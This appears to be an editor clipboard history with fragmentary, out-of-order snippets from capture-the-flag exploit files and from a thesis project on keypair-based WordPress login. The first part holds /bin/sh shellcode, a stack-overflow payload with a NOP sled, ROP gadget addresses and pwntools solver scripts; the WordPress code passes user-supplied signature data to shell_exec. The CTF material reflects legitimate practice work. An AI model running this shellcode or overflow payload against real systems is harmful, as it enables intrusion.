	\x48\x31\xc0\x50\x5f\xb0\x03\x0f\x05\x50\x48\xbf\x2f\x64\x65\x76\x2f\x74\x74\x79\x57\x54\x5f\x50\x5e\x66\xbe\x02\x27\xb0\x02\x0f\x05\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x50\x57\x54\x5e\x48\x99\xb0\x3b\x0f\x05
c46c3821999b15fe7977efdf51f8f2b3|file:///home/neo/ccsc/guydebois/shellcode.txt|42|1|V|text
	r <<< `printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00\x48\x31\xc0\x50\x5f\xb0\x03\x0f\x05\x50\x48\xbf\x2f\x64\x65\x76\x2f\x74\x74\x79\x57\x54\x5f\x50\x5e\x66\xbe\x02\x27\xb0\x02\x0f\x05\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x50\x57\x54\x5e\x48\x99\xb0\x3b\x0f\x05"`
f8f4080f812c37fb52d304c6e71c9a4c|file:///home/neo/ccsc/guydebois/shellcode.txt|42|8|v|text
	printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00\x48\x31\xc0\x50\x5f\xb0\x03\x0f\x05\x50\x48\xbf\x2f\x64\x65\x76\x2f\x74\x74\x79\x57\x54\x5f\x50\x5e\x66\xbe\x02\x27\xb0\x02\x0f\x05\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x50\x57\x54\x5e\x48\x99\xb0\x3b\x0f\x05"
f827cf462f62848df37c5e1e94a4da74|file:///home/neo/ccsc/guydebois/shell.py|4|10|v|python
	True
c284eaa09e33eccff14af89ea53a33da|file:///home/neo/ccsc/guydebois/shell.py|5|1|V|python
	INT_0x80_ADDR = 0x08059d70
51bfb65340b6f2f3686d37c0fc7d980f|file:///home/neo/ccsc/guydebois/shell.py|5|1|V|python
	POP_EAX_ADDR = 0x080c1906
1201548f98e82134ae76f03eaabda3ac|file:///home/neo/ccsc/guydebois/shell.py|5|1|V|python
	POP_EDX_ADDR = 0x0805957a
1461111d8f6f5007c90421110cd011dd|file:///home/neo/ccsc/guydebois/shell.py|5|1|V|python
	POP_EBX_ADDR = 0x0805798b
62559598317b9197a63a208c227246fd|file:///home/neo/ccsc/guydebois/shell.py|5|1|V|python
	POP_ECX_ADDR = 0x080e394a
93df686ef5160bb3e93c8248b92f2cf7|file:///home/neo/ccsc/guydebois/shell.py|5|1|V|python
	MOV_EAX_INTO_EDX_ADDR = 0x0808e22d
dfd75f7c1fbb2532799ec7474982c82a|file:///home/neo/ccsc/guydebois/shell.py|6|1|V|python
	SAFE_ADDR2 = 0x80efe10
9146ef3527c7cfcc66dc615c3986e391|file:///home/neo/ccsc/guydebois/shellcode.txt|40|16|v|text
	aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
ce12d337035425c4f8a8d3789b1e51ad|file:///home/neo/ccsc/guydebois/shell.py|27|1|V|python
	payload += write_mem(EXEC[0], SAFE_ADDR)
cde64df6c685f18f0a6400195f3bc110|file:///home/neo/ccsc/guydebois/shell.py|27|1|V|python
	payload += write_mem(EXEC[1], SAFE_ADDR+4)
bfcd974a8c9fc475dd213a08f2d96d1a|file:///home/neo/ccsc/guydebois/shell.py|27|1|V|python
	#Write SAFE_ADDR into SAFE_ADDR2
076ca0ea5e2705d5e65a94c97939084f|file:///home/neo/ccsc/guydebois/shell.py|32|1|V|python
	payload += pack(POP_EBX_ADDR) + pack(SAFE_ADDR)
f1144e1d45a5bff468c9ae831be9c2ef|file:///home/neo/ccsc/guydebois/shell.py|32|1|V|python
	payload += pack(POP_ECX_ADDR) + pack(SAFE_ADDR2)
b6f74ce8f7b757f4a12a0b67cad71580|file:///home/neo/ccsc/guydebois/shell.py|31|30|v|python
	 + pack(0xb)
66de0d244a48f201fbf8f4ba65a53eb5|file:///home/neo/ccsc/guydebois/shell.py|5|1|v|python
	SAFE_ADDR
4b0761c2e1dec907cca459d766a1ba03|file:///home/neo/ccsc/guydebois/shell.py|5|17|v|python
	80efd50
382cd65ea518b59a00d9889238231d17|file:///home/neo/ccsc/guydebois/shell.py|31|17|v|python
	POP_EAX_ADDR
9333a62433202f4896f89463228b0d49|file:///home/neo/ccsc/guydebois/shell.py|34|1|V|python
	payload += pack(INT_0x80_ADDR)
24434f803184b76ebdda8563806a006d|file:///home/neo/ccsc/guydebois/shell.py|33|1|V|python
	#Syscall
e07c6c5dc6960ee603db2acffb93d45f|file:///home/neo/ccsc/guydebois/shell.py|27|12|v|python
	nop()
0e5243d9965540f62aac19a985f3f33e|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|46|316|v|tex
	then
d3d44e5b49ad388a902b507a5feff304|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|50|1|v|tex
	Precisely
458bcf2c6d44712db9bd3487dff1e241|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|50|78|v|tex
	modifi
cb584e44c43ed6bd0bc2d9c7e242837d|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|55|61|v|tex
	nonce
7f090bbab1cc7f9c08bf4e54d932d3c0|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|57|11|v|tex
	Modify
ea3b8a60c5827df581b1a9b45debe002|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|56|5|V|tex
	    \item \textbf{}
d3ed68f7315b7e72b8d886b2278fcac3|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/form_submit.js|13|13|v|javascript
	credentials
46dbaf5cc9b487f0436bf255ecad677e|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/form_submit.js|12|9|V|javascript
	        // console.log(sig);
5dfa41b12ecbdc16196fc3b968602e66|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/pluggable.php|2330|1|V|php
	        $signature = $obj->{'signature'};
e663f07c8aaf23fb10d2db4860ae15a7|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/pluggable.php|2330|9|V|php
	        p
d45176222cf8cda9d89c4e7190254cc2|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/pluggable.php|2332|1|V|php
	        echo $signature;
85c24809d91f25cddde894e5d67edeb7|file:///home/neo/Documents/diplomatiki/auth-webapp/index.php|42|1|V|php
	        $output = preg_replace('~[\r\n]+~', '', $output);
9483161959a80719412732d96499f725|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/pluggable.php|2342|1|V|php
	        $message = "af82";
	        /* if (hash_equals($public_key, $stored) == true){ */
	        $obj = json_decode($credentials);
	        $public_key = $obj->{'public_key'};
	        $signature = $obj->{'signature'};
	        echo $signature;
	        echo $public_key;
	        $command = escapeshellcmd("python /var/www/html/verify.py $stored_pk $message $signature");
	        $output = shell_exec($command);
	        if ($output === "1"){
	            $check = true;
	        } else {
	            $check = false;
	        }
61ec7fcdc9b67b4d1660f9710bf164e9|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/auth.js|116|14|v|javascript
	public_key.concat(signature);
55442de0479884cbbd21f2719a125f3f|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/form_submit.js|22|1|V|javascript
	    credentials.then( (cred) => {
	        let submitVals = {
	            "public_key": cred.substr(0,64),
	            "signature": cred.substr(64)
	        }
	        console.log(submitVals);
	        jQuery("#user_pass").val(JSON.stringify(submitVals));//change input
	        jQuery("#loginform").off("submit");//need form submit event off.
	        self.submit();//submit form
	    })
3bc026b815790a05493fa56fc4b8d8bd|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|56|11|v|tex
	Extend
2271352b733ca0013447bc9365bf139c|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|59|30|v|tex
	  fairly simple.
cddc37b2569f1e643096ae0a9d5c18b5|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|36|1|V|tex
	\begin{lstlisting}[caption={{\tt scrypt} hash function called from Firefox using Mozilla's Web Crypto API.}]
	const encoder = new TextEncoder();
	//Get scrypt hash of password
	const passEncoded = encoder.encode(password);
	const hashScrypt = crypto.subtle.digest("SCRYPT",passEncoded);
	\end{lstlisting}
a3d0b5c10fff5a63b7c93a02d23f36a3|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|61|29|v|tex
	{\tt scrypt} hash function called from Firefox using Mozilla's Web Crypto API
6d43be90d73e5460132f32fde3d679f4|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|5|200|v|tex
	label={lst:sha512.c
97b38d41ef69cf66b909cfd6be5ed7ce|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/form_submit.js|3|24|v|javascript
	//stop submit event
5c51426e3dfa26f56a424d17b8cc613b|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/form_submit.js|4|29|v|javascript
	//this form
f50c0e62c920e90fb6f097172c38bdf5|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/form_submit.js|19|44|v|javascript
	//need form submit event off.
bdea8a5c2fb248a7d324a69ea8352b25|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/form_submit.js|20|23|v|javascript
	//submit form
6264ec24925bd71834885e34a51f52b5|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/reset_pass.js|3|27|v|javascript
	stop submit event
a83553840ed68bdb4c171ef90465395f|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/reset_pass.js|13|34|v|javascript
	//change input
0d6187a6dbf87b209ebf23f8fee502f9|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|61|15|v|tex
	log in
3421dfec8c98889a1e684d14062f7bbc|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/reset_pass.js|14|9|V|javascript
	        jQuery("#pass2").val(pk);
43ca94dd646dbbaa78034918d61043e9|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|61|198|v|tex
	signed
b2cf8c88fabae13258ae20dca0ee1b9d|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|63|1|V|tex
	\begin{lstlisting}[caption={Using the {\tt login\_enqueue\_scripts} hook to enqueue auth.js.}, label={lst:enqueue}]
	const encoder = new TextEncoder();
	//Get scrypt hash of password
	const passEncoded = encoder.encode(password);
	const hashScrypt = crypto.subtle.digest("SCRYPT",passEncoded);
	\end{lstlisting}
18249121ecd5d13c1b0e45dd929ae27c|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|70|29|v|tex
	Using the {\tt login\_enqueue\_scripts
2654793d31478fd52602cd57e38482f5|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|70|135|v|tex
	 hook to enqueue auth.js.}
bbefefc86f0f8e14738dd10638fcc2c4|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|70|144|v|tex
	lst:enqueue
ff27a6fa70ec50fbdf87b7ddb83bcfba|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/reset_pass.js|5|5|v|javascript
	initializeCredentialType
1f7325c5aa440f15869bc1bd6ffaad73|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|71|34|V|tex
	const encoder = new TextEncoder();
	//Get scrypt hash of password
	const passEncoded = encoder.encode(password);
	const hashScrypt = crypto.subtle.digest("SCRYPT",passEncoded);
038a76ff49c303550ae90604d1da70fb|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/reset_pass.js|1|1|V|javascript
	
	jQuery("#resetpassform").on("submit", function (e) {
	    e.preventDefault(); //Stop form submission
	    let self = jQuery(this);
	    initializeCredentialType({
	     passwordMinLength: 8,
	     passwordProccessMethod: "scrypt_seed_ed25519_keypair",
	    });
	    let password = jQuery("#pass1").val();
	    let public_key = register(password); //Generate the credential using auth.js
	    public_key.then( (pk) => {
	        console.log(pk);
	        jQuery("#pass1").val(pk); //Set the new credential value to be submitted
	        jQuery("#pass2").val(pk);
	        jQuery("#resetpassform").off("submit");
	        self.submit();//Submit the form
	    })
	});
2166fe02e4d8137b24f72a6eadc65a42|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|61|90|v|tex
	which 
4dd9003a4a7bd598db0b989ef3a94dd0|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/user.php|44|1|V|php
	function authjs_authenticate( $user, $username, $password ) {
fe1e5bdb576822fb21daa094830427f3|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|70|1|V|tex
	\begin{lstlisting}[caption={Javascript code that uses {\tt auth.js} API to generate the credential and submit the reset password form}, label={lst:reset_pass}]
c6e4176354069870bc2864296b8b7aaf|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/user.php|90|1|V|php
		if ( ! check_public_key( $password, $user->user_pass, $user->ID ) ) {
			return new WP_Error(
				'incorrect_public_key',
				sprintf(
					/* translators: %s: User name. */
					__( '<strong>ERROR</strong>: Wrong public key' ),
					'<strong>' . $username . '</strong>'
49f833cd1f686cf00488504c374c65d2|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/user.php|271|10|v|php
	wp_authenticate_email_password
d1420c24f33223ad6709d76630f87f27|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|90|1|V|tex
	\begin{lstlisting}[caption={Javascript code that uses {\tt auth.js} API to generate the credential and submit the reset password form}, label={lst:reset_pass}]
	function authjs_authenticate( $user, $username, $password ) {
	...
	
		if ( ! check_public_key( $password, $user->user_pass, $user->ID ) ) {
			return new WP_Error(
				'incorrect_public_key',
				sprintf(
					/* translators: %s: User name. */
					__( '<strong>ERROR</strong>: Wrong public key' ),
					'<strong>' . $username . '</strong>'
	    ...
	    }
	...
	}
	\end{lstlisting}
1e94324d682f9418eabbcd6651a81676|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|108|1|V|tex
	function authjs_authenticate( $user, $username, $password ) {
	...
	
		if ( ! check_public_key( $password, $user->user_pass, $user->ID ) ) {
			return new WP_Error(
				'incorrect_public_key',
				sprintf(
					/* translators: %s: User name. */
					__( '<strong>ERROR</strong>: Wrong public key' ),
					'<strong>' . $username . '</strong>'
	    ...
	    }
	...
	}
e757e604f3c4f03b2ee2b4293a21df81|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|107|29|v|tex
	Javascript code that uses {\tt auth.js} API to generate the credential and submit the reset password form}
1d81da29c9c50d57efc99fe9a1956ead|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|107|69|v|tex
	reset_pass
e8a9fdaab1eeaf478d390de1d6d54ca8|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|50|1|V|tex
	\subsubsection{}
542131f764dc506b7f3a4f6801721045|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|50|1|V|tex
	An overview of how the default authentication system works in WordPress 
3e5cc9bc8eff99ddf06f92847bc247e8|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|50|1|V|tex
	A brief overview of how the default authentication system of WordPress works is the following: 
f31d2ae7e48b3a79bbcc7c08e3e0b09c|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|108|1|V|tex
	\\TODO
3aa95e16795260f43c4fb578bcf72123|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|90|29|v|tex
	Javascript code that uses {\tt auth.js
e91044ccd4e5e6389036147f60590910|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|90|29|v|tex
	 API to generate the credential and submit the reset password form
343d482a1119f5917f956618052f69ed|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/user.php|197|1|V|php
	function wp_authenticate_username_password( $user, $username, $password ) {
ff5eacd875b46984e1e1b116d8b216a0|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/user.php|243|1|V|php
		if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
			return new WP_Error(
				'incorrect_password',
				sprintf(
					/* translators: %s: User name. */
					__( '<strong>ERROR</strong>: The password you entered for the username %s is incorrect.' ),
					'<strong>' . $username . '</strong>'
df77f09d327ed0f014f4aabcf0e51766|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|100|1|V|tex
					'<strong>' . $username . '</strong>'
3bec19ec421da43797041d788f537cb2|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-login.php|112|1|V|php
		add_action( 'login_enqueue_scripts', 'enqueue_authjs' );
	
		function enqueue_authjs( $page ) {
			    wp_enqueue_script( 'auth', home_url() . '/wp-includes/js/auth.js', null, null, true );
			    wp_enqueue_script( 'form_submit', home_url() . '/wp-includes/js/form_submit.js', array('jquery'), null, true );
		}
		do_action( 'login_enqueue_scripts' );
db3ca86366393d2ae62d1c791badd7cb|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|5|20|v|tex
	language=C,caption={sha512
01f6b42d7f0d7808df85417521f2c4df|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|5|20|v|tex
	language=C
ed23b0a5b93e366bf2e158f8a09bd968|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|125|19|v|tex
	language=PHP,
c5d590683c0fa48aee0f85cd43261d8a|file:///home/neo/ccsc/djinn/solve.py|11|8|v|python
	56653
471418140887b31b330b4b233b04eb97|file:///home/neo/ccsc/djinn/solve.py|10|9|v|python
	37.139.22.174
bd8c845697c84a260cb5da01ee3e5394|file:///home/neo/ccsc/djinn/solve.py|22|25|v|python
	Submit a printable string X, such that sha256(X)[-6:] = 
a8d256d8e055fcdbf41e69de2ef3b18d|file:///home/neo/ccsc/djinn/solve.py|21|1|V|python
	Provide bytes X as a hex string such that sha256(X)[-6:] =
6f9cc09697be489d2325b7e7821d8ef2|file:///home/neo/ccsc/djinn/local.py|10|1|V|python
	host = '192.168.125.10'
e00d019dba4e62197d36bfdc4646a046|file:///home/neo/ccsc/djinn/local.py|10|1|V|python
	port = 2000
efaddd52556017f18d1dcf2e7efc30fb|file:///home/neo/ccsc/djinn/local.py|34|1|V|python
	if __name__ == '__main__':
	    import sys
	    r = my_remote(host, port, show=True)
	
	    while True:
	        r.recvuntil('k = ')
	        k = int(r.recvline().strip())
	        log.info('k = ' + str(k))
	        r.recvuntil('send the first sequence: \n')
	        r.sendline(cyclic(alphabet='012', n=k))
	        r.recvuntil('send the second sequence: \n')
	        r.sendline(cyclic(alphabet='120', n=k))
	        r.recvuntil('send the third sequence: \n')
	        r.sendline(cyclic(alphabet='201', n=k))        
	
	        if k == 9:
	            break
	
	    r.interactive()
b732d596a01b5e6dad8948d88f3b0819|file:///home/neo/ccsc/djinn/local.py|15|1|V|python
	def my_remote(ip, port, show=False):
4f8b000550e5668f4035ea2ef79f47c0|file:///home/neo/ccsc/djinn/local.py|17|1|V|python
	menu = r.recvuntil('Provide bytes X as a hex string such that sha256(X)-6:] = ', drop=True)
7362f87b4201ad353435548fff8cb72d|file:///home/neo/ccsc/djinn/local.py|19|10|v|python
	r.recvline().strip()
e70c4df10ef0983b9c8c31bd06b2a2c3|file:///home/neo/ccsc/djinn/local.py|30|1|v|python
	return
f4c896e708d25ff1bd37ee4b20751219|file:///home/neo/ccsc/djinn/local.py|27|9|v|python
	r.sendline
9ad218829873e3493260f5e5cc59ddea|file:///home/neo/ccsc/djinn/local.py|16|1|V|python
	r = remote(ip, port)
bf3579f79983cc36814edb6e8d8a3c6e|file:///home/neo/ccsc/djinn/local.py|16|1|V|python
	if show:
	    print(menu)
967c6894150698efce0b2b38c94b8546|file:///home/neo/ccsc/djinn/local.py|17|19|v|python
	ascii_letters+string.digits
2c3ade19fea8b1535e2e21f585bb1f87|file:///home/neo/ccsc/djinn/local.py|18|1|V|python
	print(possible)
4856443a9cf4372563b31dbf7852359c|file:///home/neo/ccsc/djinn/local.py|22|11|v|python
	possiblw
c0fd6109220de414981ad92fa3421a24|file:///home/neo/ccsc/djinn/local.py|21|1|V|python
	for x in possible:
af2b2fcadb0be7ec4186bb95e18c5cc5|file:///home/neo/ccsc/djinn/local.py|21|5|V|python
	    print(x)
3a16ad44e5d8482aa91fa140f5cae197|file:///home/neo/ccsc/djinn/local.py|17|12|v|python
	string.hexdigits
cc5610a52c672d1a81e3494dc4ec25a7|file:///home/neo/ccsc/djinn/local.py|18|1|V|python
	# possible = string.ascii_letters+string.digits
f317d7d2c5bca3163af077b14b92d2b4|file:///home/neo/ccsc/djinn/local.py|36|9|V|python
	        hexstr = hex(c)
017dd10cf5094b45e401662a986a7cf6|file:///home/neo/ccsc/djinn/local.py|44|1|V|python
	print(res)
818863c8d8403471f887b80d69fab790|file:///home/neo/ccsc/djinn/local.py|45|1|V|python
	print(xorkey)
	print(res)
34b577be20fbc15477aadb9a08101ff9|file:///home/neo/ccsc/djinn/local.py|45|9|v|python
	string1
91c0c59c8f6fc9aa2dc99a89f2fd0ab5|file:///home/neo/ccsc/djinn/local.py|46|27|v|python
	string2
61719352407a5b941c96eaa481b406a4|file:///home/neo/ccsc/djinn/local.py|26|10|v|python
	str(sys.argv[1])
81acd73ddafedce7674e74a40b5b7268|file:///home/neo/ccsc/djinn/local.py|26|1|V|python
	target = raw_input('Give target hash:')
e4f1097efe82510a82ae3bc00d43714b|file:///home/neo/ccsc/djinn/local.py|46|1|V|python
	ct = "505106040402045256055a565456550957030153515552085a01005407580007"
42aefbae01d2dfd981f7da7d823d689e|file:///home/neo/ccsc/djinn/local.py|45|1|v|python
	target
3718f6a8199bf6275b63c762beffd92b|file:///home/neo/ccsc/djinn/local.py|45|17|v|python
	Give target hash:
f8320b26d30ab433c5a54546d21f414c|file:///home/neo/ccsc/djinn/local.py|27|30|v|python
	False
6ebaa0af9cd7464c4d9f3ac8e40f3095|file:///home/neo/ccsc/djinn/local.py|30|5|V|python
	    Provide bytes X as a hex string such that sha256(X)[-6:] =
4b94e3371bc55a67cd3aacc3f3b340b3|file:///home/neo/ccsc/djinn/local.py|35|5|V|python
	    target = raw_input('Give target hash: ')
f2fdb10271854f2e65826d3e8639d695|file:///home/neo/ccsc/djinn/local.py|51|13|V|python
	            print(resHash)
f7628315e75c5cc401ae06943c73ae5b|file:///home/neo/ccsc/djinn/local.py|39|12|V|python
	    # possible = "0123456789abcdef"
	    # possible = it.imap(''.join, it.product(possible, repeat=6))
	    # for x in possible:
	    #     print(x)
f9668d1a01c1e911f07208d95d720785|file:///home/neo/ccsc/djinn/local.py|52|5|V|python
	    print(plain)
b03886c5df6101481285d021cfe12f48|file:///home/neo/ccsc/djinn/local.py|36|5|V|python
	    print(target)
98bb875dca4d6aed16c39a52ec9ec71a|file:///home/neo/ccsc/djinn/local.py|30|1|V|python
	    menu = r.recvuntil('Provide bytes X as a hex string such that sha256(X)[-6:] = ', drop=True)
b523285b70ca6214fe61dcac6d6cabec|file:///home/neo/ccsc/djinn/local.py|49|25|v|python
	Provide bytes X as a hex string such that sha256(X)[-6:] = 
8e2e6d2fd8d18ea9f2d2d10b602817c6|file:///home/neo/ccsc/djinn/local.py|50|5|V|python
	    ct = raw_input('Give cipertext:')
12b35348ef31c3a28397072c10af2377|file:///home/neo/ccsc/djinn/local.py|34|1|V|python
	    target = r.recvline().strip()
cf8d5b1018fb3a6d29709a7c4afcafa7|file:///home/neo/ccsc/djinn/local.py|50|6|v|python
	arget
87bcda45de7b222a54d25ac7df0ae13f|file:///home/neo/ccsc/djinn/local.py|39|1|V|python
	    log.info('Target: %s' % (target))
c41a31890959544c6523af684561abe5|file:///home/neo/ccsc/djinn/local.py|50|15|v|python
	Target
1af5c79520e65e8e0f7c93e6725632e3|file:///home/neo/ccsc/djinn/local.py|50|5|V|python
	    log.info('Ciphertext: %s' % (ct))
b7df9b05dcd695aa5fcd696d0fbbe4e9|file:///home/neo/ccsc/djinn/local.py|45|1|V|python
	            r.sendline(resHash)
77c99d149201aceb0cf1222b368f2efa|file:///home/neo/ccsc/djinn/local.py|53|16|v|python
	resHash
845544b392234402b7191486e089444c|file:///home/neo/ccsc/djinn/local.py|31|1|V|python
	    if show:
390b8f20b06a8650e78c7393a2363d6a|file:///home/neo/ccsc/djinn/local.py|42|13|V|python
	            log.info('Solved - %s' % c)
0164612a5d6f0f1338f30f5316a3a6ea|file:///home/neo/ccsc/djinn/local.py|44|1|V|python
	            log.info('Solved - %s' % resHash)
d94fc22e4210113a0bf65ce29f850d94|file:///home/neo/ccsc/djinn/local.py|27|1|V|python
	def my_remote(ip, port, show=True):
3433784308ed29562aaf3dbbcc2bd05f|file:///home/neo/ccsc/djinn/local.py|55|1|V|python
	import sys
	r = my_remote(host, port, show=True)
	
	# r.interactive()
2f5b7bc32ebf066a52a2b9a7c3508d75|file:///home/neo/ccsc/djinn/local.py|53|1|V|python
	return r
e5bb6d73327858c7bf62cb0809a78da7|file:///home/neo/ccsc/djinn/local.py|28|1|V|python
	menu = r.recvuntil('Provide bytes X as a hex string such that sha256(X)[-6:] = ', drop=True)
3cc3d8d235041bc68ff019ec32094e50|file:///home/neo/ccsc/djinn/local.py|28|1|V|python
	print(menu)
8f6212e4bbcceca516e7f2bb8eab74d2|file:///home/neo/ccsc/djinn/local.py|29|1|V|python
	target = r.recvline().strip()
3dfebc806925ba40beee091a3d3ba840|file:///home/neo/ccsc/djinn/local.py|28|10|v|python
	raw_input('Give target hash: ')
4bcab2bd3eab6c51c24c5731f1902c38|file:///home/neo/ccsc/djinn/local.py|43|25|V|python
	menu = r.recvuntil('Decrypt this: ', drop=True)
	print(menu)
ed3f6b9a6a0122c633c628037027fb62|file:///home/neo/ccsc/djinn/local.py|42|1|V|python
	xorkey = resHash*8
	ct = r.recvline().strip()
	log.info('Ciphertext: %s' % (ct))
	plain = hex(int(xorkey, 16) ^ int(ct, 16)).replace('0x','')
68d6487c013ad2dadfda764d23c558fa|file:///home/neo/ccsc/djinn/ct.py|4|1|V|python
	log.info('Ciphertext: %s' % (ct))
b0e988e4e002f608d100ba77420e39cf|file:///home/neo/ccsc/djinn/local.py|42|1|V|python
	# r.sendline(plain)
6252772384ab8885c5f7870ebed89ea1|file:///home/neo/ccsc/djinn/local.py|39|8|V|python
	        r.sendline(resHash)
e6fa06ecfcb8cc4c36197cb88563116c|file:///home/neo/ccsc/djinn/ct.py|6|25|v|python
	.decode("hex"
38093bb9e0e958fcedf187cc254b3c38|file:///home/neo/ccsc/djinn/ct.py|8|1|V|python
	ct = bytes.fromhex(ctstr)
9ad891fd063403c13c296dd402c077a9|file:///home/neo/ccsc/djinn/ct.py|8|1|V|python
	print(ct)
70d66c88cbe6741a8d2e0abbf2244eb3|file:///home/neo/ccsc/djinn/ct.py|14|1|V|python
	print(md5sum)
8c6042ad570b8e52e4269372b5118d64|file:///home/neo/ccsc/djinn/ct.py|9|1|V|python
	print(b)
c7a310c32ee76899433564cc94c3db03|file:///home/neo/ccsc/djinn/ct.py|11|1|V|python
	md5sum.update(b)
a08767602c60644778349b3a5ae8f482|file:///home/neo/ccsc/djinn/ct.py|9|1|V|python
	# plain = hex(int(xorkey, 16) ^ int(ct, 16)).replace('0x','')
d8d8a6d2e9e1fb99302b479a8fe540d4|file:///home/neo/ccsc/djinn/ct.py|9|18|v|python
	sha256
b891aac95b203fec25fb4738bed7b850|file:///home/neo/ccsc/djinn/ct.py|12|1|V|python
	plain = hex(int(xorkey, 16) ^ int(hashmd5, 16)).replace('0x','')
46bd4aa9f79d359530d3d873bac6f3dc|file:///home/neo/ccsc/djinn/ct.py|7|35|v|python
	hashmd5
0852d0bed56b5dc814f7bb8fd6cab7e1|file:///home/neo/ccsc/djinn/ct.py|8|25|v|python
	ctstr
9c0d4923c647d512e8afb9e213a07da2|file:///home/neo/ccsc/djinn/ct.py|7|1|V|python
	plain = hex(int(xorkey, 16) ^ int(ctstr, 16)).replace('0x','')
5e3897d227fa00acf8136b9950232274|file:///home/neo/ccsc/djinn/ct.py|7|25|v|python
	plain.replace('L','')
8e27b76cbb74b87b1bdb044408ace53d|file:///home/neo/ccsc/djinn/ct.py|6|27|V|python
	xorkey = str(sys.argv[1])*4
	ctstr = str(sys.argv[2])
aa57e99b20348118eff5a541a0a9ff3c|file:///home/neo/ccsc/djinn/ct.py|14|1|v|python
	xorkey
de6c933d30c95001a8ad4ec8ed8a0288|file:///home/neo/ccsc/djinn/ct.py|5|1|V|python
	def hashThenXor(xorkey, ctstr)
	    ct = binascii.unhexlify(ctstr)
	    b = bytes(ct)
	    md5sum = hashlib.md5(b)
	    hashmd5 = md5sum.hexdigest()
	    print(hashmd5)
	    plain = hex(int(xorkey, 16) ^ int(hashmd5, 16)).replace('0x','')
	    print(plain)
2a87ef9c5bedae661d41f3e80cc5f22c|file:///home/neo/ccsc/djinn/ct.py|14|5|v|python
	hashThenXor
0a7c321ea1825c4d62553457cec37678|file:///home/neo/ccsc/djinn/ct.py|25|1|V|python
	hashThenXor(key*8, ctstr)
5fe4d1e7a9799495ad8c1c11efc480e2|file:///home/neo/ccsc/djinn/ct.py|26|1|v|python
	ashThenXor
30ae3966a81a06cfa95109eb1b535407|file:///home/neo/ccsc/djinn/ct.py|20|5|V|python
